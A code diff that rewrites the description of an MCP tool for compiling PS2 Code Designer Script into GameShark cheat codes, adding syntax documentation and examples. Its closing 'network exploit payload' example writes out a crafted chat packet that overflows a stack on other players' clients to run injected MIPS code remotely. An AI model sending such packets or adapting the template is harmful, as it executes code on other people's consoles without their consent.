@@ -97,12 +97,132 @@ public sealed class Mips64LeTools(SocketBridgeClient bridge)
     }
 
     [McpServerTool(Name = "compile_cds")]
-    [Description("Compile a Code Designer Script (.cds) source file into PS2 GameShark/Action Replay cheat codes. " +
-                 "Supports: address/hexcode/print/setreg directives, label definitions (Name:), " +
-                 "branch label references (:Name), absolute address references (@Name), " +
-                 "two-pass label resolution, and full MIPS instruction assembly. " +
-                 "Each assembled instruction is emitted as a type-2 GameShark code (2AAAAAAA VVVVVVVV). " +
-                 "Comments: // ; # and /* */ block comments are supported.")]
+    [Description(
+        "Compile a Code Designer Script (.cds) source file into PS2 GameShark/Action Replay cheat codes.\n\n" +
+
+        "=== WHAT IS CDS? ===\n" +
+        "Code Designer Script is a PS2 exploit/code-injection language. It lets you write real MIPS64 EE " +
+        "assembly that is packaged as GameShark type-2 codes (2AAAAAAA VVVVVVVV). Each type-2 code writes " +
+        "a 32-bit word to a target address when the cheat engine ticks, so a compiled CDS program installs " +
+        "your machine code into RAM at the addresses you choose. A typical use-case is patching game logic, " +
+        "hooking functions, or injecting a custom payload that runs via a crafted network packet, stack " +
+        "overflow, or function pointer overwrite.\n\n" +
+
+        "=== OUTPUT FORMAT ===\n" +
+        "Every 4-byte word emitted by the compiler becomes one GameShark code:\n" +
+        "  2AAAAAAA VVVVVVVV\n" +
+        "where AAAAAAA is the PS2 EE physical address and VVVVVVVV is the 32-bit value to write. " +
+        "The cheat engine applies these codes once per frame while the game is running.\n\n" +
+
+        "=== DIRECTIVES ===\n" +
+        "  address $XXXXXXXX   — Set the current write cursor to this virtual/physical EE address.\n" +
+        "                        All following instructions/data are emitted from this address onward.\n" +
+        "  hexcode $XXXXXXXX   — Emit exactly 4 raw bytes (big-endian 32-bit word) at the current address.\n" +
+        "                        Used for hand-coded data, packet headers, filler patterns, or magic values.\n" +
+        "  print \"text\"        — Emit the ASCII/UTF-8 bytes of the string as consecutive code words.\n" +
+        "                        Each 4-byte chunk becomes one code. Pads with 0x00 if needed.\n" +
+        "  setreg REG, $VALUE  — Emit a LUI+ADDIU/ORI pair that loads a full 32-bit immediate into REG.\n" +
+        "  setreg REG, :label  — Same but uses the label's resolved address as the immediate.\n\n" +
+
+        "=== LABELS ===\n" +
+        "  Name:               — Define a label at the current address (e.g. fnc_ChatPacket:, str_Message:).\n" +
+        "                        Label names may contain letters, digits, and underscores.\n" +
+        "  :Name               — Reference a label in branch/jump instructions (j :loop, jal :fnc_Name)\n" +
+        "                        or in setreg (setreg t2, :str_Message). Resolved in a two-pass compile.\n" +
+        "  @Name               — Reference a label's address as a raw 32-bit value in hexcode/data context.\n\n" +
+
+        "=== MIPS INSTRUCTION ASSEMBLY ===\n" +
+        "All PS2 EE MIPS64 instructions are supported inline (addiu, sw, lw, jal, j, jr, lui, ori, " +
+        "daddu, sb, lb, lh, sh, lw, ld, sw, sd, beq, bne, bgez, bltz, sll, srl, sra, nop, etc.). " +
+        "Write one instruction per line. Branch delay slots must be filled manually (use nop if needed). " +
+        "Register names: $zero/$0, $at/$1, $v0–$v1, $a0–$a3, $t0–$t9, $s0–$s7, $k0–$k1, $gp, $sp, $fp, $ra.\n\n" +
+
+        "=== COMMENTS ===\n" +
+        "  // single-line comment\n" +
+        "  ;  single-line comment\n" +
+        "  #  single-line comment\n" +
+        "  /* multi-line block comment */\n\n" +
+
+        "=== COMMON PATTERNS ===\n" +
+        "Hook a function at $0022F4DC, redirect to custom code at $000A0000, then jump back:\n" +
+        "  address $0022F4DC\n" +
+        "  jal :fnc_MyHook       // replace the original jal\n" +
+        "  nop\n" +
+        "  j $0022F510           // skip rest of original function\n" +
+        "  nop\n\n" +
+        "Load a pointer and call a function:\n" +
+        "  address $000A0000\n" +
+        "  fnc_MyHook:\n" +
+        "  addiu sp, sp, $fff0\n" +
+        "  sw ra, $0000(sp)\n" +
+        "  setreg a0, $0045D480  // load 32-bit address into $a0 via LUI+ORI\n" +
+        "  jal $0032A420\n" +
+        "  nop\n" +
+        "  lw ra, $0000(sp)\n" +
+        "  jr ra\n" +
+        "  addiu sp, sp, $10\n\n" +
+        "Embed a raw data payload after code:\n" +
+        "  str_Payload:\n" +
+        "  hexcode $140          // packet size field\n" +
+        "  print \"AAAA...\"       // 136-byte filler\n" +
+        "  hexcode $11111111     // overwrite stack slot 1\n" +
+        "  hexcode $20E0EB70     // pointer to t9 in PacketDataPool\n\n" +
+
+        "=== FULL EXAMPLE (network exploit payload) ===\n" +
+        "/*\n" +
+        " * Sends a crafted ChatMessage packet that causes the receiving client to\n" +
+        " * execute the payload at str_Message. Player name must be exactly 3 chars.\n" +
+        " */\n" +
+        "// 1. Replace mute hook with call to our function\n" +
+        "address $0022F4DC\n" +
+        "jal :fnc_ChatPacket\n" +
+        "nop\n" +
+        "j $0022F510\n" +
+        "nop\n\n" +
+        "// 2. Overwrite 'Mute Off' string (used as packet trigger)\n" +
+        "address $00411178\n" +
+        "print \"TOGGLE\"\n\n" +
+        "// 3. Our chat-packet builder (installed in scratch RAM)\n" +
+        "address $000A0000\n" +
+        "fnc_ChatPacket:\n" +
+        "addiu sp, sp, $fff0\n" +
+        "sw ra, $0000(sp)\n" +
+        "setreg a0, $0045D480   // session master pointer\n" +
+        "addiu a1, zero, $0040\n" +
+        "lui a2, $0046\n" +
+        "lw a2, $D574(a2)\n" +
+        "lui a3, $0044\n" +
+        "lw a3, $F9D8(a3)\n" +
+        "lw a3, $0FC8(a3)       // player ID\n" +
+        "ori t0, zero, $9       // chat packet ID\n" +
+        "addiu t1, zero, $140   // data size (must not exceed $1D0)\n" +
+        "setreg t2, :str_Message\n" +
+        "jal $0032A420\n" +
+        "daddu t3, zero, zero\n" +
+        "lw ra, $0000(sp)\n" +
+        "jr ra\n" +
+        "addiu sp, sp, $10\n\n" +
+        "// 4. Packet data — overwrites stack slots on remote client\n" +
+        "str_Message:\n" +
+        "hexcode $140            // data size header\n" +
+        "print \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"   // 136-byte filler\n" +
+        "hexcode $11111111\n" +
+        "hexcode $22222222\n" +
+        "hexcode $33333333\n" +
+        "hexcode $20E0EB70       // pointer to t9 slot in PacketDataPool\n" +
+        "hexcode $00000000\n" +
+        "hexcode $00000000\n" +
+        "hexcode $00000000\n" +
+        "hexcode $00000000\n" +
+        "hexcode $20E0EB84       // pointer to payload entry (must end in $20, not $00)\n\n" +
+        "// 5. Payload — executes on remote client (~30 instructions max before packet splits)\n" +
+        "// address $00E0EB84   (recalculate if payload length changes)\n" +
+        "lui t0, $0045\n" +
+        "lw t0, $D648(t0)        // load player object pointer\n" +
+        "addiu t1, zero, $1\n" +
+        "sb t1, $0FCF(t0)        // set respawn flag\n" +
+        "j $00644D50             // return to packet receiver (drops packet)\n" +
+        "addiu sp, sp, $1d0      // restore SP to packet receiver frame\n")]
     public async Task<string> CompileCds(
         [Description("CDS source code to compile.")] string sourceCode,
         CancellationToken cancellationToken = default)
